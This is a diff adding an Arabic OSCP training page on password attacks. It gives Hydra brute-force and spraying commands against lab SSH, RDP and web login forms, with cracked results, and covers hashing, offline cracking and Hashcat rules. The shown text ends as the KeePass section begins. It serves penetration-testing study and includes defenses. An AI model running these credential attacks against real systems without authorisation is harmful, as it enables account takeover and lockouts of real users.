@@ -1,0 +1,792 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OSCP · Module 13: هجمات كلمات المرور</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg-0:#0B0B0D;--bg-1:#121214;--surface:#17171A;--surface-2:#1D1D21;
+    --border:#2A2A2F;--border-soft:#232326;
+    --text:#E6E6E9;--text-soft:#C4C4CA;--muted:#8A8A92;
+    --red:#E1362F;--red-soft:rgba(225,54,47,0.10);--red-border:rgba(225,54,47,0.35);
+    --red-grad:linear-gradient(90deg,#E1362F,#F2794A);
+    --amber:#E8A23A;--amber-soft:rgba(232,162,58,0.09);--amber-border:rgba(232,162,58,0.30);
+    --green:#3FBF6E;--green-soft:rgba(63,191,110,0.09);--green-border:rgba(63,191,110,0.30);
+    --blue:#4EA1D3;--blue-soft:rgba(78,161,211,0.09);--blue-border:rgba(78,161,211,0.30);
+    --purple:#A179E8;--purple-soft:rgba(161,121,232,0.10);--purple-border:rgba(161,121,232,0.32);
+    --mono:'IBM Plex Mono','Courier New',monospace;
+  }
+  html[data-theme="light"]{
+    --bg-0:#F4F3F1;--bg-1:#ECEBE8;--surface:#FFFFFF;--surface-2:#F3F2EF;
+    --border:#DEDCD6;--border-soft:#E6E4DF;
+    --text:#1C1B19;--text-soft:#3C3A36;--muted:#726F68;
+  }
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0;direction:rtl;text-align:right;background:var(--bg-0);}
+  body{font-family:'Cairo','Segoe UI',Tahoma,sans-serif;line-height:1.95;font-size:16.5px;color:var(--text);
+    background:radial-gradient(900px 420px at 12% -8%,rgba(225,54,47,0.10),transparent 60%),radial-gradient(800px 420px at 90% 6%,rgba(232,162,58,0.06),transparent 60%),linear-gradient(180deg,var(--bg-0) 0%,var(--bg-1) 100%);
+    background-attachment:fixed;transition:background 0.2s ease,color 0.2s ease;}
+  html[data-theme="light"] body{background:radial-gradient(900px 420px at 12% -8%,rgba(225,54,47,0.06),transparent 60%),radial-gradient(800px 420px at 90% 6%,rgba(232,162,58,0.05),transparent 60%),linear-gradient(180deg,var(--bg-0) 0%,var(--bg-1) 100%);}
+  .progress-rail{position:fixed;top:0;inset-inline:0;height:3px;background:rgba(255,255,255,0.04);z-index:60;}
+  html[data-theme="light"] .progress-rail{background:rgba(0,0,0,0.05);}
+  .progress-bar{height:100%;width:0%;background:var(--red-grad);transition:width 0.08s linear;}
+  .float-controls{position:fixed;bottom:22px;left:22px;z-index:55;display:flex;flex-direction:column;gap:10px;}
+  .fctrl-btn{width:42px;height:42px;border-radius:50%;background:var(--surface);border:1px solid var(--border);color:var(--text-soft);display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:16px;box-shadow:0 10px 24px -10px rgba(0,0,0,0.5);transition:transform 0.15s ease,border-color 0.15s ease,opacity 0.2s ease;}
+  .fctrl-btn:hover{transform:translateY(-2px);border-color:var(--red-border);color:var(--red);}
+  #toTop{opacity:0;pointer-events:none;}#toTop.show{opacity:1;pointer-events:auto;}
+  .page{max-width:860px;margin:0 auto;padding:46px 22px 100px;}
+  .banner{position:relative;overflow:hidden;background:linear-gradient(155deg,var(--surface) 0%,var(--bg-1) 55%,var(--surface) 100%);border:1px solid var(--border-soft);border-radius:10px;padding:0 0 34px;margin-bottom:26px;box-shadow:0 20px 50px -20px rgba(0,0,0,0.6);}
+  .term-bar{display:flex;align-items:center;gap:8px;padding:13px 18px;border-bottom:1px solid var(--border-soft);background:rgba(255,255,255,0.015);direction:ltr;}
+  .term-dot{width:11px;height:11px;border-radius:50%;display:inline-block;}
+  .term-dot.r{background:#E1362F;}.term-dot.y{background:#E8A23A;}.term-dot.g{background:#3FBF6E;}
+  .term-path{margin-inline-start:12px;font-family:var(--mono);font-size:12px;color:var(--muted);}
+  .theme-switch{margin-inline-start:auto;font-family:var(--mono);font-size:11px;color:var(--muted);background:transparent;border:1px solid var(--border);border-radius:4px;padding:4px 9px;cursor:pointer;}
+  .theme-switch:hover{color:var(--amber);border-color:var(--amber-border);}
+  .banner-body{padding:30px 34px 4px;}
+  .banner .kicker{display:inline-block;font-family:var(--mono);font-size:12.5px;letter-spacing:0.03em;color:var(--red);background:var(--red-soft);border:1px solid var(--red-border);border-radius:3px;padding:5px 12px;margin-bottom:20px;direction:ltr;}
+  .banner h1{margin:0 0 14px;font-size:28px;font-weight:800;line-height:1.5;color:var(--text);}
+  .banner .lede{color:var(--muted);font-size:15.5px;line-height:1.95;max-width:640px;margin:0 0 24px;}
+  .tags{display:flex;flex-wrap:wrap;gap:9px;}
+  .tag{font-size:12.5px;font-family:var(--mono);color:var(--amber);background:var(--amber-soft);border:1px solid var(--amber-border);border-radius:3px;padding:5px 11px;}
+  .toc{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:6px 0;margin-bottom:50px;overflow:hidden;}
+  .toc-title{font-family:var(--mono);font-weight:600;font-size:13px;color:var(--green);padding:14px 22px;border-bottom:1px solid var(--border-soft);direction:ltr;text-align:left;}
+  .toc-list{display:flex;flex-direction:column;}
+  .toc-item{display:flex;align-items:center;gap:14px;padding:12px 22px;color:var(--text-soft);text-decoration:none;font-size:14.5px;border-bottom:1px solid rgba(255,255,255,0.03);transition:background 0.15s ease;}
+  .toc-list .toc-item:last-child{border-bottom:none;}
+  .toc-item:hover{background:var(--red-soft);}
+  .toc-num{flex:none;font-family:var(--mono);font-size:12.5px;font-weight:600;color:#0F0F10;background:var(--red-grad);border-radius:3px;padding:3px 8px;direction:ltr;}
+  h1,h2,h3,h4{font-weight:700;}
+  h2{display:flex;align-items:center;gap:14px;font-size:21px;margin:66px 0 22px;padding-bottom:16px;border-bottom:1px solid var(--border-soft);color:var(--text);}
+  h2 .num{flex:none;font-family:var(--mono);font-size:13px;font-weight:700;color:#0F0F10;background:var(--red-grad);border-radius:5px;padding:7px 12px;direction:ltr;}
+  h2 .htext{line-height:1.5;}
+  h3{font-size:17px;margin:34px 0 14px;color:var(--red);display:flex;align-items:center;gap:9px;}
+  h3::before{content:"#";font-family:var(--mono);color:var(--amber);font-weight:700;}
+  h4{font-size:14.8px;margin:22px 0 10px;color:var(--text-soft);font-family:var(--mono);}
+  p{margin:0 0 17px;color:var(--text);}
+  strong{color:var(--text);font-weight:700;}
+  :root:not([data-theme="light"]) strong{color:#FBFBFC;}
+  a{color:var(--amber);text-decoration:none;border-bottom:1px dashed var(--amber-border);}
+  hr{border:none;height:1px;margin:50px 0;background:linear-gradient(90deg,transparent,var(--border),transparent);}
+  ul,ol{margin:0 0 18px;padding-inline-start:24px;}
+  li{margin-bottom:9px;color:var(--text);}
+  li::marker{color:var(--red);font-family:var(--mono);}
+  li>ul,li>ol{margin-top:9px;}
+  .goals-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:10px;margin:0 0 22px;}
+  .goal-card{display:flex;gap:10px;align-items:flex-start;background:var(--surface);border:1px solid var(--border-soft);border-radius:7px;padding:13px 15px;font-size:14px;color:var(--text-soft);}
+  .goal-card .gi{flex:none;font-family:var(--mono);font-size:11px;font-weight:700;color:var(--green);background:var(--green-soft);border:1px solid var(--green-border);border-radius:4px;width:22px;height:22px;display:flex;align-items:center;justify-content:center;}
+  blockquote{margin:24px 0;padding:17px 22px;background:var(--red-soft);border:1px solid var(--red-border);border-inline-start:3px solid var(--red);border-radius:6px;color:var(--text-soft);}
+  blockquote p{margin:0;color:inherit;line-height:1.85;}
+  blockquote p+p{margin-top:10px;}
+  blockquote strong{color:var(--text);}
+  .callout{margin:24px 0;padding:17px 22px 18px;border-radius:6px;border:1px solid var(--border-soft);border-inline-start:3px solid var(--border);background:var(--surface);}
+  .callout p{margin:0;color:var(--text-soft);line-height:1.85;}
+  .callout p+p{margin-top:10px;}
+  .callout-label{display:inline-flex;align-items:center;gap:7px;font-family:var(--mono);font-size:11.5px;font-weight:700;letter-spacing:0.02em;text-transform:uppercase;margin-bottom:10px;direction:ltr;}
+  .callout.note{border-inline-start-color:var(--blue);background:var(--blue-soft);}.callout.note .callout-label{color:var(--blue);}
+  .callout.warning{border-inline-start-color:var(--red);background:var(--red-soft);}.callout.warning .callout-label{color:var(--red);}
+  .callout.tip{border-inline-start-color:var(--green);background:var(--green-soft);}.callout.tip .callout-label{color:var(--green);}
+  .callout.examtip{border-inline-start-color:var(--purple);background:var(--purple-soft);}.callout.examtip .callout-label{color:var(--purple);}
+  .callout.case{border-inline-start-color:var(--amber);background:var(--amber-soft);}.callout.case .callout-label{color:var(--amber);}
+  .callout.definition{border-inline-start-color:var(--muted);background:var(--surface-2);}.callout.definition .callout-label{color:var(--text-soft);}
+  .table-wrap{overflow-x:auto;margin:22px 0;border:1px solid var(--border-soft);border-radius:8px;}
+  table{width:100%;border-collapse:collapse;font-size:14.2px;min-width:480px;}
+  thead th{background:var(--surface-2);color:var(--amber);font-weight:700;font-family:var(--mono);font-size:12.5px;text-transform:uppercase;letter-spacing:0.02em;text-align:start;padding:13px 15px;border-bottom:1px solid var(--border-soft);white-space:nowrap;}
+  tbody td{padding:12px 15px;border-bottom:1px solid var(--border-soft);color:var(--text-soft);vertical-align:top;}
+  tbody tr:last-child td{border-bottom:none;}
+  tbody tr:nth-child(even){background:rgba(127,127,127,0.03);}
+  tbody tr:hover{background:var(--red-soft);}
+  code{font-family:var(--mono);font-size:13.3px;background:var(--surface-2);border:1px solid var(--border-soft);border-radius:4px;padding:2px 6px;direction:ltr;unicode-bidi:embed;color:var(--green);}
+  .code-wrap{position:relative;overflow-x:auto;margin:22px 0;}
+  .code-tag{position:absolute;top:10px;left:14px;font-family:var(--mono);font-size:10.5px;color:var(--muted);letter-spacing:0.04em;text-transform:uppercase;z-index:2;}
+  .copy-btn{position:absolute;top:8px;right:10px;z-index:2;font-family:var(--mono);font-size:11px;color:var(--muted);background:var(--surface-2);border:1px solid var(--border-soft);border-radius:4px;padding:4px 9px;cursor:pointer;direction:ltr;}
+  .copy-btn:hover{color:var(--amber);border-color:var(--amber-border);}
+  .copy-btn.copied{color:var(--green);border-color:var(--green-border);}
+  pre{background:var(--bg-0);border:1px solid var(--border-soft);border-inline-start:3px solid var(--red);border-radius:8px;padding:30px 22px 18px;direction:ltr;text-align:left;margin:0;}
+  html[data-theme="light"] pre{background:#16181C;}
+  pre code{background:none;border:none;padding:0;color:#B9E8C9;font-size:13.2px;line-height:1.75;}
+  .diagram-card{background:var(--surface);border:1px solid var(--border-soft);border-radius:10px;padding:22px 18px 16px;margin:24px 0;}
+  .diagram-card svg{width:100%;height:auto;display:block;}
+  .diagram-caption{margin-top:10px;text-align:center;font-family:var(--mono);font-size:11.5px;color:var(--muted);}
+  .takeaways{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:18px 22px 20px;margin:30px 0 10px;}
+  .takeaways-title{font-family:var(--mono);font-size:12.5px;font-weight:700;color:var(--green);margin-bottom:12px;direction:ltr;text-align:left;display:flex;align-items:center;gap:8px;}
+  .takeaways ul{margin:0;padding-inline-start:20px;}
+  .takeaways li{color:var(--text-soft);font-size:14.5px;}
+  .cheat-section h4{color:var(--amber);font-size:13px;margin:26px 0 8px;}
+  .step-track{display:flex;flex-direction:column;gap:0;margin:24px 0;}
+  .step-item{position:relative;padding:0 0 26px 0;padding-inline-start:46px;border-inline-start:2px solid var(--border-soft);}
+  .step-item:last-child{border-inline-start:2px solid transparent;padding-bottom:4px;}
+  .step-num{position:absolute;inset-inline-start:-17px;top:0;width:32px;height:32px;border-radius:50%;background:var(--red-grad);color:#0F0F10;font-family:var(--mono);font-weight:700;font-size:13px;display:flex;align-items:center;justify-content:center;}
+  .step-title{font-weight:700;color:var(--text);margin-bottom:6px;font-size:15px;}
+  .step-body{color:var(--text-soft);font-size:14.5px;}
+  .step-body p{margin:0 0 10px;}.step-body p:last-child{margin-bottom:0;}
+  /* two-col comparison */
+  .compare-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin:22px 0;}
+  @media(max-width:620px){.compare-grid{grid-template-columns:1fr;}}
+  .cmp-card{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:16px 18px;}
+  .cmp-title{font-family:var(--mono);font-size:12px;font-weight:700;letter-spacing:0.03em;text-transform:uppercase;margin-bottom:12px;padding-bottom:8px;border-bottom:1px solid var(--border-soft);}
+  .cmp-card.red .cmp-title{color:var(--red);}
+  .cmp-card.blue .cmp-title{color:var(--blue);}
+  .cmp-card.green .cmp-title{color:var(--green);}
+  .cmp-card.amber .cmp-title{color:var(--amber);}
+  .cmp-card ul{margin:0;padding-inline-start:18px;}
+  .cmp-card li{font-size:13.5px;color:var(--text-soft);margin-bottom:7px;}
+  /* rule demo */
+  .rule-demo{background:var(--surface-2);border:1px solid var(--border-soft);border-radius:8px;padding:16px 20px;margin:18px 0;direction:ltr;text-align:left;}
+  .rule-row{display:flex;align-items:center;gap:14px;margin-bottom:10px;font-family:var(--mono);font-size:13px;}
+  .rule-row:last-child{margin-bottom:0;}
+  .rule-label{color:var(--muted);min-width:28px;}
+  .rule-code{color:var(--green);min-width:60px;}
+  .rule-arrow{color:var(--border);flex:none;}
+  .rule-val{color:var(--amber);}
+  .rule-comment{color:var(--muted);font-size:11.5px;margin-inline-start:auto;}
+  .footer-note{margin-top:70px;padding-top:26px;border-top:1px solid var(--border-soft);color:var(--muted);font-size:13.3px;font-family:var(--mono);text-align:center;direction:ltr;}
+  @media print{.float-controls,.progress-rail,.copy-btn,.theme-switch{display:none !important;}body{background:#fff;color:#000;}.page{max-width:100%;}}
+  @media(max-width:640px){.page{padding:28px 14px 70px;}.banner-body{padding:24px 20px 4px;}.banner h1{font-size:21px;}h2{font-size:18px;gap:10px;}.float-controls{left:12px;bottom:14px;}}
+</style>
+</head>
+<body>
+
+<div class="progress-rail"><div class="progress-bar" id="progressBar"></div></div>
+<div class="float-controls">
+  <button class="fctrl-btn" id="toTop" title="ارجع لفوق" aria-label="ارجع لفوق">↑</button>
+</div>
+
+<div class="page">
+
+  <div class="banner">
+    <div class="term-bar">
+      <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+      <span class="term-path">root@oscp:~/module-13$</span>
+      <button class="theme-switch" id="themeSwitch">theme: dark</button>
+    </div>
+    <div class="banner-body">
+      <span class="kicker">OSCP · PEN-200 · Module 13</span>
+      <h1>هجمات كلمات المرور (Password Attacks)</h1>
+      <p class="lede">من هجمات brute-force على SSH وRDP وHTTP بـ Hydra، لحد كسر KeePass وSSH keys بـ Hashcat وJohn، واستخراج NTLM بـ Mimikatz، وابتكار PtH وNTLMv2 relay كطرق lateral movement بدون كلمة مرور.</p>
+      <div class="tags">
+        <span class="tag">hydra</span>
+        <span class="tag">hashcat</span>
+        <span class="tag">mimikatz</span>
+        <span class="tag">pass-the-hash</span>
+        <span class="tag">responder</span>
+        <span class="tag">ntlmrelayx</span>
+      </div>
+    </div>
+  </div>
+
+<nav class="toc"><div class="toc-title">$ ls learning_units/</div><div class="toc-list">
+<a class="toc-item" href="#lu1"><span class="toc-num">01</span><span class="toc-label">مهاجمة خدمات الشبكة — SSH · RDP · HTTP POST</span></a>
+<a class="toc-item" href="#lu2"><span class="toc-num">02</span><span class="toc-label">أساسيات كسر كلمات المرور — Hashing · Rules · Wordlists</span></a>
+<a class="toc-item" href="#lu3"><span class="toc-num">03</span><span class="toc-label">كسر KeePass وSSH Private Keys</span></a>
+<a class="toc-item" href="#lu4"><span class="toc-num">04</span><span class="toc-label">NTLM Hashes وPass-the-Hash</span></a>
+<a class="toc-item" href="#lu5"><span class="toc-num">05</span><span class="toc-label">Net-NTLMv2 — التقاط وكسر وإعادة توجيه</span></a>
+<a class="toc-item" href="#cheat"><span class="toc-num">--</span><span class="toc-label">Cheat Sheet مرجعي</span></a>
+<a class="toc-item" href="#summary"><span class="toc-num">--</span><span class="toc-label">الخلاصة العامة للموديول</span></a>
+</div></nav>
+
+<hr />
+
+<h2 id="lu1"><span class="num">01</span><span class="htext">مهاجمة خدمات الشبكة — SSH · RDP · HTTP POST</span></h2>
+<h3>أهداف الوحدة</h3>
+<div class="goals-grid">
+  <div class="goal-card"><span class="gi">1</span><span>تنفيذ هجمات brute-force ودictionary على خدمات SSH وRDP وHTTP</span></div>
+  <div class="goal-card"><span class="gi">2</span><span>فهم الفرق بين Brute Force وDictionary Attack وPassword Spraying</span></div>
+  <div class="goal-card"><span class="gi">3</span><span>استخدام Hydra بفعالية على بروتوكولات مختلفة</span></div>
+</div>
+
+<h3>ليه الخدمات الشبكية هدف</h3>
+<p>الخدمات المواجِهة للإنترنت زي SSH وRDP وVNC وصفحات الدخول بتتعرّض لمحاولات كسر تلقائية تقريبًا فور ما تيجي أونلاين. أدوات كسر بيانات الاعتماد الآلية بقت في متناول الجميع وسهلة الاستخدام.</p>
+
+<div class="compare-grid">
+<div class="cmp-card red">
+  <div class="cmp-title">Brute Force</div>
+  <ul>
+    <li>بيجرّب كل تركيبة حرف ممكنة</li>
+    <li>بطيء لكن شامل</li>
+    <li>مضمون لو الـ keyspace صغير</li>
+    <li>ممكن يستغرق سنين على كلمات مرور طويلة</li>
+  </ul>
+</div>
+<div class="cmp-card blue">
+  <div class="cmp-title">Dictionary Attack</div>
+  <ul>
+    <li>بيجرّب كلمات مرور من قائمة (wordlist)</li>
+    <li>سريع جدًا مقارنةً بالـ brute force</li>
+    <li>بيحتاج الباسورد الصح يكون موجود في القائمة</li>
+    <li>rockyou.txt: ملايين باسوردات حقيقية مسرَّبة</li>
+  </ul>
+</div>
+</div>
+<div class="callout definition">
+<div class="callout-label">⬦ Password Spraying</div>
+<p>بيجرّب كلمة مرور واحدة معروفة ضد كثير من أسماء المستخدمين — عكس الـ brute force الكلاسيكي. فعّال لما بيانات اعتماد تسرَّبت أو وُجدت في ملف مكشوف أو أُعيد استخدامها عبر خدمات.</p>
+</div>
+
+<h3>هجوم SSH بأداة Hydra</h3>
+<div class="callout case">
+<div class="callout-label">✎ السيناريو</div>
+<p>الهدف: SSH على بورت 2222 على <code>192.168.50.201</code> | اسم مستخدم معروف: <code>george</code> | الهدف: إيجاد باسورد george</p>
+</div>
+<div class="code-wrap"><span class="code-tag">bash</span><pre><code># 1. تأكيد تشغيل الخدمة
+nmap -sV -p 2222 192.168.50.201
+
+# 2. فك ضغط قائمة rockyou
+sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+
+# 3. شنّ هجوم Hydra على SSH
+hydra -l george \
+  -P /usr/share/wordlists/rockyou.txt \
+  -s 2222 192.168.50.201 ssh
+
+# النتيجة
+# [2222][ssh] host: 192.168.50.201  login: george  password: iloveyou
+</code></pre></div>
+<p><strong>ليه نجح:</strong> الباسورد الصح موجود في rockyou.txt، واسم مستخدم صالح تم الحصول عليه أثناء الاستطلاع.</p>
+
+<h3>Password Spraying ضد RDP</h3>
+<div class="code-wrap"><span class="code-tag">bash</span><pre><code># -L قائمة أسماء مستخدمين  |  -p كلمة مرور واحدة
+hydra -L userlist.txt \
+  -p "Password123!" \
+  192.168.50.202 rdp
+</code></pre></div>
+<div class="callout warning">
+<div class="callout-label">⚠ تحذير مهم</div>
+<p>محاولات الدخول الكبيرة بتولّد logs أمنية كثيرة وتنبيهات. سياسات lockout الحسابات ممكن تعطّل حسابات وتؤثر على مستخدمين حقيقيين. دايمًا افعل استطلاعًا دقيقًا قبل الإطلاق — خصوصًا في بيئات إنتاجية.</p>
+</div>
+
+<h3>هجوم HTTP POST Login Form</h3>
+<p>تقريبًا كل اختبار اختراق بيتضمّن تطبيقات ويب بفيها موارد محمية بتوثيق. لو الباسوردات الافتراضية فشلت، هجمات القائمة على صفحات الدخول بتبقى الخيار التالي. التوثيق الويب بيستخدم HTTP — بيحتاج معلومات إضافية مقارنةً بـ SSH/RDP.</p>
+
+<h4>معلومتان حرجتان مطلوبتان</h4>
+<ol>
+<li><strong>معطيات طلب POST</strong> — أسماء الحقول الدقيقة للـ username والـ password (مثلًا <code>fm_usr</code>، <code>fm_pwd</code>)</li>
+<li><strong>مؤشّر الفشل</strong> — نص في استجابة السيرفر بيشير لمحاولة دخول فاشلة</li>
+</ol>
+<p>كيفية الحصول عليهما: استخدام proxy اعتراضي زي <strong>Burp Suite</strong> لالتقاط طلب HTTP الخام، وإرسال تسجيل دخول تجريبي لرؤية رسالة الفشل الدقيقة اللي بيرجّعها السيرفر.</p>
+
+<div class="callout case">
+<div class="callout-label">✎ السيناريو: TinyFileManager</div>
+<p>حساب معروف: <code>admin / user</code> | الباسوردات الافتراضية فشلت → استخدام wordlist | جسم POST المُلتقَط: <code>fm_usr=user&amp;fm_pwd=test123</code> | رسالة الفشل: <code>"Login failed"</code></p>
+</div>
+<div class="code-wrap"><span class="code-tag">bash</span><pre><code>hydra -l user \
+  -P /usr/share/wordlists/rockyou.txt \
+  192.168.50.201 http-post-form \
+  "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed"
+
+# النتيجة
+# [80][http-post-form] host: 192.168.50.201  login: user  password: 121212
+</code></pre></div>
+
+<h3>الكشف والدفاعات</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>ما يراه المدافعون</th><th>الإجراء الدفاعي</th></tr></thead>
+<tbody>
+<tr><td>حجم كبير من طلبات الدخول الفاشلة في وقت قصير</td><td>WAF — يمنع أو يُعلم عن الحجم الشاذ</td></tr>
+<tr><td>محاولات متكررة من IP واحد</td><td>Rate Limiting — يحدّ محاولات الدخول لكل IP</td></tr>
+<tr><td>طلبات تستهدف حسابات أو endpoints محددة</td><td>fail2ban / Account Lockout — يحجب الـ IPs بعد N فشل</td></tr>
+<tr><td>أنماط ترافيك غير معتادة على صفحات الدخول</td><td>CAPTCHA — يمنع الأدوات الآلية من إرسال النماذج</td></tr>
+</tbody>
+</table></div>
+
+<div class="takeaways">
+<div class="takeaways-title">$ cat ./lu1_takeaways.txt</div>
+<ul>
+<li>Hydra بتدعم عشرات البروتوكولات — SSH، RDP، HTTP، FTP، SMB وغيرها</li>
+<li>SSH/RDP: <code>-l</code> للمستخدم الواحد، <code>-L</code> للقائمة | <code>-p</code> للباسورد الواحد، <code>-P</code> للقائمة</li>
+<li>HTTP POST: بتحتاج مسار الـ form، معطيات الـ POST، ومؤشّر الفشل — كلهم جوّه قيمة module واحدة</li>
+<li>Password Spraying = باسورد واحد × كثير مستخدمين — يقلّل خطر الـ lockout مقارنةً بالـ brute force</li>
+</ul>
+</div>
+
+<hr />
+
+<h2 id="lu2"><span class="num">02</span><span class="htext">أساسيات كسر كلمات المرور</span></h2>
+<h3>Encryption مقابل Hashing</h3>
+<div class="compare-grid">
+<div class="cmp-card blue">
+  <div class="cmp-title">Encryption (قابل للعكس)</div>
+  <ul>
+    <li>بيحوّل البيانات لـ ciphertext باستخدام مفتاح</li>
+    <li>المفتاح الصح يستعيد البيانات الأصلية</li>
+    <li><strong>Symmetric (AES):</strong> نفس المفتاح للتشفير وفكّه — خطر اعتراض المفتاح</li>
+    <li><strong>Asymmetric (RSA):</strong> مفتاح عام للتشفير، مفتاح خاص لفكّه — يحلّ مشكلة تبادل المفاتيح</li>
+  </ul>
+</div>
+<div class="cmp-card green">
+  <div class="cmp-title">Hashing (أحادي الاتجاه)</div>
+  <ul>
+    <li>بيحوّل أي إدخال لبصمة بطول ثابت (hash)</li>
+    <li>نفس الإدخال → نفس الخرج دايمًا</li>
+    <li>لا يمكن عكسه بشكل واقعي</li>
+    <li>حتى تغيير صغير ينتج hash مختلف تمامًا</li>
+    <li>شائع: MD5، SHA-1، SHA-256، SHA-512، bcrypt</li>
+  </ul>
+</div>
+</div>
+
+<h3>تخزين كلمات المرور بدوال الـ Hash</h3>
+<p><strong>إزاي التطبيقات بتخزّن الباسوردات:</strong> المستخدم بيُنشئ باسورد ← النظام بيعمل له hash ← بس الـ hash بيتخزَّن في قاعدة البيانات. عند الدخول: الباسورد المُدخَل بيتعمل له hash ← بيتقارن مع الـ hash المخزَّن ← تطابق = وصول مسموح. المدراء والمهاجمون اللي بيوصلوا لقاعدة البيانات بيشوفوا bashes فقط — مش نص واضح.</p>
+
+<h3>مزايا الكسر Offline مقابل الهجمات Online</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>Offline (Hashcat / John)</th><th>Online (Hydra)</th></tr></thead>
+<tbody>
+<tr><td>لا ترافيك شبكة — حسابات محلية بالكامل</td><td>كل محاولة تولّد ترافيك شبكة</td></tr>
+<tr><td>لا account lockouts — محاولات غير محدودة</td><td>ممكن يُعطّل حسابات ويُنبّه الأمان</td></tr>
+<tr><td>لا تنبيهات في أنظمة التوثيق</td><td>Logs مرئية للمدافعين</td></tr>
+<tr><td>ممكن يتوزَّع على كثير GPUs لسرعة هائلة</td><td>مقيَّد بسرعة الشبكة والـ lockout policies</td></tr>
+</tbody>
+</table></div>
+
+<h3>أدوات الكسر وتقدير الوقت</h3>
+<div class="compare-grid">
+<div class="cmp-card amber">
+  <div class="cmp-title">Hashcat</div>
+  <ul>
+    <li>GPU-optimized (آلاف الـ cores المتوازية)</li>
+    <li>يدعم أكثر من 300 نوع hash</li>
+    <li>محرّك قواعد، masks، combinator attacks</li>
+  </ul>
+</div>
+<div class="cmp-card red">
+  <div class="cmp-title">John the Ripper</div>
+  <ul>
+    <li>CPU-based (يدعم GPU عبر plugins)</li>
+    <li>يكشف صيغ الـ hash تلقائيًا</li>
+    <li>قواعد mangling مدمجة</li>
+  </ul>
+</div>
+</div>
+
+<h3>معادلة وقت الكسر</h3>
+<blockquote>
+<p><strong>الوقت = Search Space ÷ Speed</strong> &nbsp;|&nbsp; <strong>Search Space = (حجم charset) ^ (طول الباسورد)</strong></p>
+<p>62 حرف × 5 حروف = 916 مليون تركيبة | 62 حرف × 8 حروف = 218 تريليون | <strong>بـ GPU SHA-256 (~9.2 مليار hash/ثانية):</strong> 5 حروف ≈ 0.1 ثانية | 8 حروف ≈ 6.5 ساعة | 10 حروف mixed ≈ سنين. الباسوردات القوية (12+ حرف، مختلطة) بتقاوم الكسر offline.</p>
+</blockquote>
+
+<h3>تحوير الـ Wordlist والهجمات القائمة على القواعد</h3>
+<p><strong>المشكلة مع القوائم العادية:</strong> سياسات الباسورد الحديثة بتتطلب uppercase وأرقام ورموز. معظم مدخلات rockyou.txt بتفشل هذه المتطلبات. التعديل اليدوي لملايين المدخلات غير عملي.</p>
+<p><strong>الحل: تحويل قائمة القواعد (Rule-Based)</strong> — ملف قواعد يحتوي تعليمات تحويل تُطبَّق على كل مدخل في القائمة. العمليات: إضافة حروف، تغيير الحالة، استبدال حروف، إعادة ترتيب الأجزاء.</p>
+<p><strong>مثال: كيف <code>password</code> يتحوّل لـ <code>Password1!</code></strong></p>
+<div class="rule-demo">
+  <div class="rule-row"><span class="rule-label">c</span><span class="rule-arrow">→</span><span class="rule-val">Password</span><span class="rule-comment">capitalize first letter</span></div>
+  <div class="rule-row"><span class="rule-label">$1</span><span class="rule-arrow">→</span><span class="rule-val">Password1</span><span class="rule-comment">append '1'</span></div>
+  <div class="rule-row"><span class="rule-label">$!</span><span class="rule-arrow">→</span><span class="rule-val">Password1!</span><span class="rule-comment">append '!'</span></div>
+</div>
+<div class="callout note">
+<div class="callout-label">ⓘ Order Matters</div>
+<p>ترتيب القواعد مهم: "أضف ! ثم 1" يعطي <code>Password!1</code> — نتيجة مختلفة! كذلك <strong>bcrypt</strong> بيبطّئ الكسر عمدًا — يقلّل ميزة GPU.</p>
+</div>
+
+<h3>سير العمل الكامل لكسر كلمة المرور — 5 مراحل</h3>
+<div class="step-track">
+<div class="step-item"><div class="step-num">1</div><div class="step-title">الحصول على الـ Hashes</div><div class="step-body"><p>تصدير من قاعدة بيانات مخترَقة، memory dump، أو ترافيك شبكة ملتقَط</p></div></div>
+<div class="step-item"><div class="step-num">2</div><div class="step-title">تحديد صيغة الـ Hash</div><div class="step-body"><p>استخدام <code>hashid</code> أو <code>hash-identifier</code> لتحديد الخوارزمية — نوع غلط = صفر نتائج</p></div></div>
+<div class="step-item"><div class="step-num">3</div><div class="step-title">تقييم الجدوى</div><div class="step-body"><p>تقدير وقت الكسر = keyspace ÷ سرعة GPU؛ مراعاة مواعيد نهاية المهمة</p></div></div>
+<div class="step-item"><div class="step-num">4</div><div class="step-title">تجهيز الـ Wordlist</div><div class="step-body"><p>تطبيق تحويلات rule-based، تحليل سياسة الباسورد، الاستفادة من مجموعات الاختراقات</p></div></div>
+<div class="step-item"><div class="step-num">5</div><div class="step-title">التنفيذ والتحقق</div><div class="step-body"><p>شنّ Hashcat/John بالوضع الصحيح؛ التحقق من النتائج — أخطاء إملائية أو وضع خاطئ يضيّع كل المجهود</p></div></div>
+</div>
+
+<hr />
+
+<h2 id="lu3"><span class="num">03</span><span class="htext">كسر KeePass وSSH Private Keys</span></h2>
+<h3>مدراء كلمات المرور — لماذا هم أهداف ذات قيمة عالية</h3>
+<ul>
+<li>بيخزّنوا بيانات اعتماد لعشرات/مئات الخدمات خلف باسورد رئيسي واحد</li>
+<li>اختراق vault واحد يمنح وصولًا محتملًا لكل الأنظمة المخزَّنة</li>
+<li>KeePass بيخزّن الـ vaults كملفات <code>.kdbx</code> — قابلة للنقل offline للكسر</li>
+<li>أمثلة: KeePass، 1Password، Bitwarden</li>
+</ul>
+
+<h3>هجوم KeePass — خطوة بخطوة</h3>
+<div class="step-track">
